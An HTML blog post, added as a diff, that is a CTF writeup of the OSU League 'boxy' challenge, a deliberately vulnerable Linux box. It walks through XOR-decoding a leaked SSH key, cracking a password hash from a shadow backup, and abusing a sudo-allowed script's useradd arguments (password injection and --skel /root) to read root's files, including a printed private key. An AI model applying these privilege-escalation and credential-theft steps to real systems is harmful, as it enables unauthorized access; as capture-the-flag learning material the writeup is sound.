@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Time to poke at a linux box and see what there is to find. Im going to give you the flag right now, and the program to decrypt it too! You will have to find 7 flags to solve this challenge! They will be combined through Shamir Secret Sharing, and allow you to decrypt the flag!
+ For this challenge, we worked in one large group taking turns to solve various parts of the box." />
+<meta name="keywords" content=", osuleague, ctf, security" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="/blog/boxy/" />
+
+
+    <title>
+        
+            OSU League 2020/2021 - boxy Writeup :: Cameron McCawley 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.d1ea4af8fd04fb24a4f8b882ea54bd04eb245427ca4baf527c81a5dab071410b.css">
+
+
+
+
+
+
+<meta itemprop="name" content="OSU League 2020/2021 - boxy Writeup">
+<meta itemprop="description" content="Time to poke at a linux box and see what there is to find. Im going to give you the flag right now, and the program to decrypt it too! You will have to find 7 flags to solve this challenge! They will be combined through Shamir Secret Sharing, and allow you to decrypt the flag!
+ For this challenge, we worked in one large group taking turns to solve various parts of the box.">
+<meta itemprop="datePublished" content="2021-03-01T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2021-03-01T00:00:00+00:00" />
+<meta itemprop="wordCount" content="2435">
+<meta itemprop="image" content=""/>
+
+
+
+<meta itemprop="keywords" content="osuleague,ctf,security," />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content=""/>
+
+<meta name="twitter:title" content="OSU League 2020/2021 - boxy Writeup"/>
+<meta name="twitter:description" content="Time to poke at a linux box and see what there is to find. Im going to give you the flag right now, and the program to decrypt it too! You will have to find 7 flags to solve this challenge! They will be combined through Shamir Secret Sharing, and allow you to decrypt the flag!
+ For this challenge, we worked in one large group taking turns to solve various parts of the box."/>
+
+
+
+    <meta property="og:title" content="OSU League 2020/2021 - boxy Writeup" />
+<meta property="og:description" content="Time to poke at a linux box and see what there is to find. Im going to give you the flag right now, and the program to decrypt it too! You will have to find 7 flags to solve this challenge! They will be combined through Shamir Secret Sharing, and allow you to decrypt the flag!
+ For this challenge, we worked in one large group taking turns to solve various parts of the box." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/blog/boxy/" />
+<meta property="og:image" content=""/>
+<meta property="article:published_time" content="2021-03-01T00:00:00+00:00" />
+<meta property="article:modified_time" content="2021-03-01T00:00:00+00:00" /><meta property="og:site_name" content="Cameron McCawley" />
+
+
+
+
+
+
+    <meta property="article:published_time" content="2021-03-01 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+    </head>
+
+    <body class="dark-theme">
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">cd ~/cameronmccawley</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/about/">About</a></li><li><a href="/blog/">Blog</a></li><li><a href="/resume.pdf">Resume</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+
+            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+</span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="/blog/boxy/">OSU League 2020/2021 - boxy Writeup</a></h2>
+
+            
+
+            <div class="post-content">
+                <blockquote>
+<p>Time to poke at a linux box and see what there is to find. Im going to give you the flag right now, and the program to decrypt it too!
+You will have to find 7 flags to solve this challenge! They will be combined through Shamir Secret Sharing, and allow you to decrypt the flag!</p>
+</blockquote>
+<p>For this challenge, we worked in one large group taking turns to solve various parts of the box.  Because of this, and because of the poor documentation we had while solving the box, some of the solutions we came up with are going to be a bit fuzzy in this writeup.</p>
+<p>To start, we are given an IP address of a linux box, so let&rsquo;s do what every pentester must do and give that boy an nmap:</p>
+<pre><code>Starting Nmap 7.70 ( https://nmap.org ) at 2021-02-26 18:15 PST
+Nmap scan report for 172.17.0.2
+Host is up (0.00030s latency).
+Not shown: 65533 closed ports
+PORT      STATE SERVICE
+1337/tcp  open  waste
+13337/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 3.76 seconds
+</code></pre><p>Great! We have two open ports, let&rsquo;s netcat to them to see what&rsquo;s up.</p>
+<p>Connection to port 1337, we get this:</p>
+<pre><code>SSH Backup service, Key requested... Implementing security... done... sending...
+SWhJaHVpZHNkSWhJaDtnc2RlZHNoYmo7TVIxdU1SMEJTVGVLVWhDUVREV05UME9ISEdDUlJXW0NXRFRmUjFXW01SMXVNUjFKWGtPQmNGS3RVb3FpUHtHeFZtaXNlRlNwU1RHQ1BUR0NQamIwZWxLdVdUR0NQVEdHWGwxNGVXcVNQVEdDUFRHQ1BUR0NQakdDUFRHT2UxR0NQVEcxZGxMeFsyU2BXdnFTZFQ0VFdZaVFUVEdDUFRPQlhsU2xYVmIzWGxHbmNHaTVSMkB2VGxbRWNVbXtSMk9yWzBDMltEdWBiSWltZWtXc1cybXRbSVdoVFRHQ1BUcURlVmlKW1Y5MmMwT1hCb0dDUFRHQ1BZUzdYe0tvZUdxWVRZbU5XR1c1VTBHQ1BUR0VQbEtqW2xHb09sS2lgRnlYZER1dkxHS2xQMzE0YjF1e2NGZVBlM1NNVm9DNVtZWDBgMGU0Y2xTMFhtREpQVEdDU1RPM2BUW3dTR3EwVFVpb1t4dWtWbEwxV2tLSFRUTzJOR21PWFdxamVHW1ZNMk9VTzFPcmMzU1BgVDByZUVENGJUU3ZlSUdJV2xbR2JWNFJTa2lNWGtLMmJQcTRXMUR3UGtDdmNWNEZPaDh1VGxLTVtFSDBlREdDUFRHRUwxcUNYe09WYDNIe1tJW2hMbUszUFdHS1FQbnVNUjF1TVRXTlNCQ1FURFdOVDBPSEhHQ1JSV1tDV0RUZlIxV1tNUjF1TVIxSjspMy0wOTgzODMxNTE2ODI5NTk0OTYzODI3NDU1MzIzNzU5MDI5ODMxNSg=
+goodbye!
+</code></pre><p>Interesting&hellip; let&rsquo;s do it again:</p>
+<pre><code>SSH Backup service, Key requested... Implementing security... done... sending...
+FjcWNyo2Oyw7FjcWN2Q4LDs6Oyw3PTVkEg1uKhINbx0MCzoUCjccDgsbCBELbxAXFxgcDQ0IBBwIGws5DW4IBBINbioSDW4VBzQQHTwZFCsKMC42DyQYJwkyNiw6GQwvDAsYHA8LGBwPNT1vOjMUKggLGBwPCxgYBzNuazoILgwPCxgcDwsYHA8LGBwPNRgcDwsYEDpuGBwPCxhuOzMTJwRtDD8IKS4MOwtrCwgGNg4LCxgcDwsQHQczDDMHCT1sBzMYMTwYNmoNbR8pCzMEGjwKMiQNbRAtBG8cbQQbKj89FjYyOjQILAhtMisEFgg3CwsYHA8LLhs6CTYVBAlmbTxvEAcdMBgcDwsYHA8GDGgHJBQwOhguBgsGMhEIGAhqCm8YHA8LGBoPMxQ1BDMYMBAzFDY/GSYHOxsqKRMYFDMPbG5rPW4qJDwZOg86bAwSCTAcagQGB28/bzprPDMMbwcyGxUPCxgcDAsQbD8LBCgMGC5vCwo2MAQnKjQJMxNuCDQUFwsLEG0RGDIQBwguNToYBAkSbRAKEG4QLTxsDA8/C28tOhobaz0LDCk6FhgWCDMEGD0Jaw0MNDYSBzQUbT0PLmsIbhsoDzQcKTwJaxkQN2cqCzMUEgQaF286GxgcDwsYGhNuLhwHJBAJP2wXJAQWBDcTMhRsDwgYFA4PMSoSDW4qEgsIEQwdHA4LGwgRC28QFxcYHA0NCAQcCBsLOQ1uCAQSDW4qEg1uFWR2bHJvZmdsZ2xuam5pZ21mamZrZmlsZ21oa2pqbG1saGpmb21mZ2xuanc=
+goodbye!
+</code></pre><p>We did this a few more times until one of us decided to compare some in hex:</p>
+<pre><code>16 37 16 37 2a 36 3b 2c 3b 16 37 16 37 64 38 2c 3b 3a 3b 2c 37 3d 35 64 12 0d 6e 2a 12 0d 6f 1d 0c 0b 3a 14 0a 37 1c 0e 0b 1b 08 11 0b 6f 10 17 17 18 1c 0d 0d 08 04 1c 08 1b 0b 39 0d 6e 08 04 12 0d 6e 2a 12 0d 6e 15 07 34 10 1d 3c 19 14 2b 0a 30 2e 36 0f 24 18 27 09 32 36 2c 3a 19 0c 2f 0c 0b 18 1c 0f 0b 18 1c 0f 35 3d 6f 3a 33 14 2a 08 0b 18 1c 0f 0b 18 18 07 33 6e 6b 3a 08 2e 0c 0f 0b 18 1c 0f 0b 18 1c 0f 0b 18 1c 0f 35 18 1c 0f 0b 18 10 3a 6e 18 1c 0f 0b 18 6e 3b 33 13 27 04 6d 0c 3f 08 29 2e 0c 3b 0b 6b 0b 08 06 36 0e 0b 0b 18 1c 0f 0b 10 1d 07 33 0c 33 07 09 3d 6c 07 33 18 31 3c 18 36 6a 0d 6d 1f 29 0b 33 04 1a 3c 0a 32 24 0d 6d 10 2d 04 6f 1c 6d 04 1b 2a 3f 3d 16 36 32 3a 34 08 2c 08 6d 32 2b 04 16 08 37 0b 0b 18 1c 0f 0b 2e 1b 3a 09 36 15 04 09 66 6d 3c 6f 10 07 1d 30 18 1c 0f 0b 18 1c 0f 06 0c 68 07 24 14 30 3a 18 2e 06 0b 06 32 11 08 18 08 6a 0a 6f 18 1c 0f 0b 18 1a 0f 33 14 35 04 33 18 30 10 33 14 36 3f 19 26 07 3b 1b 2a 29 13 18 14 33 0f 6c 6e 6b 3d 6e 2a 24 3c 19 3a 0f 3a 6c 0c 12 09 30 1c 6a 04 06 07 6f 3f 6f 3a 6b 3c 33 0c 6f 07 32 1b 15 0f 0b 18 1c 0c 0b 10 6c 3f 0b 04 28 0c 18 2e 6f 0b 0a 36 30 04 27 2a 34 09 33 13 6e 08 34 14 17 0b 0b 10 6d 11 18 32 10 07 08 2e 35 3a 18 04 09 12 6d 10 0a 10 6e 10 2d 3c 6c 0c 0f 3f 0b 6f 2d 3a 1a 1b 6b 3d 0b 0c 29 3a 16 18 16 08 33 04 18 3d 09 6b 0d 0c 34 36 12 07 34 14 6d 3d 0f 2e 6b 08 6e 1b 28 0f 34 1c 29 3c 09 6b 19 10 37 67 2a 0b 33 14 12 04 1a 17 6f 3a 1b 18 1c 0f 0b 18 1a 13 6e 2e 1c 07 24 10 09 3f 6c 17 24 04 16 04 37 13 32 14 6c 0f 08 18 14 0e 0f 31 2a 12 0d 6e 2a 12 0b 08 11 0c 1d 1c 0e 0b 1b 08 11 0b 6f 10 17 17 18 1c 0d 0d 08 04 1c 08 1b 0b 39 0d 6e 08 04 12 0d 6e 2a 12 0d 6e 15 64 76 6c 72 6f 66 67 6c 67 6c 6e 6a 6e 69 67 6d 66 6a 66 6b 66 69 6c 67 6d 68 6b 6a 6a 6c 6d 6c 68 6a 66 6f 6d 66 67 6c 6e 6a 77
+</code></pre><pre><code>81 a0 81 a0 bd a1 ac bb ac 81 a0 81 a0 f3 af bb ac ad ac bb a0 aa a2 f3 85 9a f9 bd 85 9a f8 8a 9b 9c ad 83 9d a0 8b 99 9c 8c 9f 86 9c f8 87 80 80 8f 8b 9a 9a 9f 93 8b 9f 8c 9c ae 9a f9 9f 93 85 9a f9 bd 85 9a f9 82 90 a3 87 8a ab 8e 83 bc 9d a7 b9 a1 98 b3 8f b0 9e a5 a1 bb ad 8e 9b b8 9b 9c 8f 8b 98 9c 8f 8b 98 a2 aa f8 ad a4 83 bd 9f 9c 8f 8b 98 9c 8f 8f 90 a4 f9 fc ad 9f b9 9b 98 9c 8f 8b 98 9c 8f 8b 98 9c 8f 8b 98 a2 8f 8b 98 9c 8f 87 ad f9 8f 8b 98 9c 8f f9 ac a4 84 b0 93 fa 9b a8 9f be b9 9b ac 9c fc 9c 9f 91 a1 99 9c 9c 8f 8b 98 9c 87 8a 90 a4 9b a4 90 9e aa fb 90 a4 8f a6 ab 8f a1 fd 9a fa 88 be 9c a4 93 8d ab 9d a5 b3 9a fa 87 ba 93 f8 8b fa 93 8c bd a8 aa 81 a1 a5 ad a3 9f bb 9f fa a5 bc 93 81 9f a0 9c 9c 8f 8b 98 9c b9 8c ad 9e a1 82 93 9e f1 fa ab f8 87 90 8a a7 8f 8b 98 9c 8f 8b 98 91 9b ff 90 b3 83 a7 ad 8f b9 91 9c 91 a5 86 9f 8f 9f fd 9d f8 8f 8b 98 9c 8f 8d 98 a4 83 a2 93 a4 8f a7 87 a4 83 a1 a8 8e b1 90 ac 8c bd be 84 8f 83 a4 98 fb f9 fc aa f9 bd b3 ab 8e ad 98 ad fb 9b 85 9e a7 8b fd 93 91 90 f8 a8 f8 ad fc ab a4 9b f8 90 a5 8c 82 98 9c 8f 8b 9b 9c 87 fb a8 9c 93 bf 9b 8f b9 f8 9c 9d a1 a7 93 b0 bd a3 9e a4 84 f9 9f a3 83 80 9c 9c 87 fa 86 8f a5 87 90 9f b9 a2 ad 8f 93 9e 85 fa 87 9d 87 f9 87 ba ab fb 9b 98 a8 9c f8 ba ad 8d 8c fc aa 9c 9b be ad 81 8f 81 9f a4 93 8f aa 9e fc 9a 9b a3 a1 85 90 a3 83 fa aa 98 b9 fc 9f f9 8c bf 98 a3 8b be ab 9e fc 8e 87 a0 f0 bd 9c a4 83 85 93 8d 80 f8 ad 8c 8f 8b 98 9c 8f 8d 84 f9 b9 8b 90 b3 87 9e a8 fb 80 b3 93 81 93 a0 84 a5 83 fb 98 9f 8f 83 99 98 a6 bd 85 9a f9 bd 85 9c 9f 86 9b 8a 8b 99 9c 8c 9f 86 9c f8 87 80 80 8f 8b 9a 9a 9f 93 8b 9f 8c 9c ae 9a f9 9f 93 85 9a f9 bd 85 9a f9 82 f3 e1 fb e5 f8 f1 f0 fb f0 fb f9 fd f9 fe f0 fa f1 fd f1 fc f1 fe fb f0 fa ff fc fd fd fb fa fb ff fd f1 f8 fa f1 f0 fb f9 fd e0
+</code></pre><p>This is interesting! We can see that the first 4 bytes repeat! <code>16 37 16 37</code> and <code>81 a0 81 a0</code>.  Our <del>god-like guess skills</del> intuition told us that this is being XORed with a random key, so let&rsquo;s bruteforce our way to solution:</p>
+<pre><code>Key = 01: iHithereHiHi:frederick:LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNCYmRmYWc2YmFobFh4S3AwUmZDbTlzS3NsZ1B3ZEtacHhldjVrV3luZHViUUFBQUpEdWhKZW83b1NYCnFBQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQmJkZmFnNmJhaGxYeEtwMFJmQ205c0tzbGdQd2RLWnB4ZXY1a1d5bmR1YlEKQUFBRUN2aUZvRFp1UThnZytjWmM0VjJIUUN3OFlNYVpkdFZWL3NTN0Nsb2RQaU1sdDE5cURwdHFHVmZFcW5SRjhLYjJ3cQp5V0EvQjBwbW5GNi9tUmJLZDI1dEFBQUFDM0pBYzNWa2IzZHZiMlJ2QVFJPQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K:(2,18929204079384858729365442326481389204)
+</code></pre><p>We get the first flag: <code>(2,18929204079384858729365442326481389204)</code>, sweet. We also have a name <code>fredercik</code>, along with a long string that sort of looks like a key when you convert it to base64, but we&rsquo;ll save that for in a bit.</p>
+<p>Connecting to the other port, port 13337, we see that it&rsquo;s actually just OpenSSH. So let&rsquo;s try to connect to it with that name and key we got from the last step to see if we can get into the box.</p>
+<pre><code>$ ssh -i key frederick@3.138.157.23 -p 13337
+
+$ whoami
+Frederick
+</code></pre><p>Alright, we are in! Right away we see two files in Fred&rsquo;s home directory: <code>password_guide</code> and <code>top_100_password_ideas</code>. Cating out <code>password_guide</code> we see:</p>
+<pre><code>Hi,
+
+To make a strong password, pick one from the list I included and add 2 digits onto the end!
+</code></pre><p>Neat, so it seems like their &ldquo;strong password&rdquo; is just going to be one of the hundred in that list + 2 digits, which to brute force is only 10,000 passwords.  But what will be be brute forcing exactly?</p>
+<p>After doing some more enumeration on the box, we notice that Frederick has read access to <code>shadow.bak</code>, a backup of the file that stores the encrypted passwords for all users. Taking a look at this gives us a pretty good idea of what password we need to crack:</p>
+<pre><code>root:!(5,27562576550131620089134738750424271702):18644:0:99999:7:::
+daemon:*:18644:0:99999:7:::
+bin:*:18644:0:99999:7:::
+sys:*:18644:0:99999:7:::
+sync:*:18644:0:99999:7:::
+games:*:18644:0:99999:7:::
+man:*:18644:0:99999:7:::
+lp:*:18644:0:99999:7:::
+mail:*:18644:0:99999:7:::
+news:*:18644:0:99999:7:::
+uucp:*:18644:0:99999:7:::
+proxy:*:18644:0:99999:7:::
+www-data:*:18644:0:99999:7:::
+backup:*:18644:0:99999:7:::
+list:*:18644:0:99999:7:::
+irc:*:18644:0:99999:7:::
+gnats:*:18644:0:99999:7:::
+nobody:*:18644:0:99999:7:::
+_apt:*:18644:0:99999:7:::
+systemd-timesync:*:18644:0:99999:7:::
+systemd-network:*:18644:0:99999:7:::
+systemd-resolve:*:18644:0:99999:7:::
+messagebus:*:18644:0:99999:7:::
+sshd:*:18644:0:99999:7:::
+systemd-coredump:!!:18644::::::
+frederick:!:18683:0:99999:7:::
+oldadmin:$6$S73ABQAuFHt.hyVw$2SB2MgTdEf5W2exQzr4kpgpvZ30lUubEPGlNkKlXYLxbPn7TG1IFh9aBzZrJ4VfYcymewmwJaW9WC3RKUVZKx/:18683:0:99999:7:::
+</code></pre><p>Not only that, but we get our second flag! <code>(5,27562576550131620089134738750424271702)</code></p>
+<p>So at this point it&rsquo;s clear that we need to get access to oldadmin. We can use johntheripper with our knowledge of how the passwords are choosen to quickly crack the pass:</p>
+<p>After tinkering with john for a bit, we were eventually able to recover the password: <code>freedom42</code>. We now are able to SU to oldadmin with that password :)</p>
+<p>As <code>oldadmin</code>, we continued to do a bit more enumeration. Looking through /etc/, we were able to cat out the <code>sudoers</code> files:</p>
+<pre><code>#
+# This file MUST be edited with the 'visudo' command as root.
+#
+# Please consider adding local content in /etc/sudoers.d/ instead of
+# directly modifying this file.
+#
+# See the man page for details on how to write a sudoers file.
+#
+Defaults        env_reset
+Defaults        mail_badpass
+Defaults        secure_path=&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;
+
+# Host alias specification
+
+# User alias specification
+
+# Cmnd alias specification
+
+# User privilege specification
+root    ALL=(ALL:ALL) ALL
+
+# Allow members of group sudo to execute any command
+
+%sudo   ALL=(ALL:ALL) ALL
+
+
+oldadmin ALL=(root) NOPASSWD:/root/script/adopt_dog
+# See sudoers(5) for more information on &quot;#include&quot; directives:
+
+#includedir /etc/sudoers.d
+</code></pre><p>Seems like as oldadmin we can run <code>/root/script/adopt_dog</code> without needing root&rsquo;s password! Let&rsquo;s check that out:</p>
+<pre><code>#!/bin/bash
+
+userdel dog
+rm -rf /home/dog
+
+ARGS=$(echo &quot;$@&quot; | tr &quot;\\\\()&lt;&gt;\`&quot; &quot; &quot;)
+
+groupadd dog
+useradd -g dog $ARGS -g dog -G dog -m -d /home/dog dog
+</code></pre><p>This script seems to take in any number of arguments (minus a few special blacklist characters), and then runs them with <code>useradd</code> to create a new user <code>dog</code>.  Trying it out, we do see that it does indeed create that dog user and a home directory for it, but how do we <em>become</em> the dog? Well, since we have control over the arguments that are excecuted, we can just provide it with the encrypted password and then SU into the new user. Let&rsquo;s try it out:</p>
+<pre><code>$ sudo ./adopt_dog -p $(echo &quot;boop&quot; | openssl passwd -1 -stdin)
+$ su dog
+Password:
+$ whoami
+dog
+</code></pre><p>Neato! We are now a dog <del>my wildest dreams have come true</del>. What can we do with our newfound powers? Well, we can go check out our home!</p>
+<p>Going to our home directory, we see&hellip;. a flag? <code>(6,103859969563713920733890450469614298693)</code>.</p>
+<p>That&rsquo;s great and all, but where in the world did it come from? The script we ran didn&rsquo;t move anything into the home directory, and there is no cron job that&rsquo;s updating this directory with the flag.  Well it&rsquo;s because of <code>/etc/skel</code>, which is one of the open parameters in the adopt_dog script. So the script checks <code>/etc/skel</code> by default, and anything in that directory get&rsquo;s placed into dog&rsquo;s home directory. Since we have control over that parameter, we can actually tell the script to include any directory we want with <code>--skel</code> and we will be able to read it! Let&rsquo;s do it with the root directory and see if we can get root&rsquo;s private ssh keys.</p>
+<p>SUing into dog again, we can now view all of root&rsquo;s files, including a <code>flag</code> file in their <code>.ssh</code> directory! <code>(7,115317666936746434141387300928816667814)</code></p>
+<p>We also have root&rsquo;s private keys, so we can just ssh into root whenever we want, sweet!</p>
+<pre><code>-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACA8/OKb2sIToYOGTKGRNcUTYFLZF+cp7JVqqWioCrfWAgAAAJBRR7KIUUey
+iAAAAAtzc2gtZWQyNTUxOQAAACA8/OKb2sIToYOGTKGRNcUTYFLZF+cp7JVqqWioCrfWAg
+AAAECMbmo1F61KDqpoOr0f7JKJ0+dmSZuVZETjuQfWyDhhajz84pvawhOhg4ZMoZE1xRNg
+UtkX5ynslWqpaKgKt9YCAAAAC3JAc3Vkb3dvb2RvAQI=
+-----END OPENSSH PRIVATE KEY-----
+</code></pre><p>Checking out the rest of root&rsquo;s files, we get another flag in <code>.bashrc</code>: <code>(1,41771917274972003437877223622233833933)</code> (This one had us stumped for a bit, our inner guess gods let us down on this one)</p>
+<p>We also did a bit more enumeration, specifically on the services that were running, and we found that there was running service on port 1338 that could only be reached through the localhost.  Netcating to that service gave us our second to last flag! <code>(3,66827439388718004166721471471671102060)</code></p>
+<p>At this point, we have done pretty much everything we could without root privilages, so let&rsquo;s use that key we got earlier to ssh into root.</p>
+<p>After even more enumeration and random guessing later, we found that root has access to the a file <code>/opt/what/this/is/interesting/follow/this/path/to/get/a/flag/where/does/it/end/wow/this/is/taking/a/while/hmm/okay/tap/tap/tap/tap/tap/tap/hmm/here/you/go/lol/flag</code>. A bunch of tabs presses later, and we get our last flag:  <code>(4,121577997023255799331813434873849479391)</code></p>
+<p>Phew! We can now put all these flags in shares.cvs, run the python script to decrypt the flag, and BOOM:</p>
+<pre><code>osu{Shamir_makes_me_sad_but_linux_scavenger_hunt_makes_me_glad}
+</code></pre><p>Woop!</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+  				<p>
+  					<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="tags/osuleague">osuleague</a></span><span class="tag"><a href="tags/ctf">ctf</a></span><span class="tag"><a href="tags/security">security</a></span>
+  				</p>
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2021</span>
+            
+            
+                <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
+            
+            <span> <a href="posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+        </div>
+    </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+
+<script type="text/javascript" src="/bundle.min.dc716e9092c9820b77f96da294d0120aeeb189b5bcea9752309ebea27fd53bbe6b13cffb2aca8ecf32525647ceb7001f76091de4199ac5a3caa432c070247f5b.js" integrity="sha512-3HFukJLJggt3&#43;W2ilNASCu6xibW86pdSMJ6&#43;on/VO75rE8/7KsqOzzJSVkfOtwAfdgkd5BmaxaPKpDLAcCR/Ww=="></script>
+
+
+
+
+		
+    </body>
+</html>
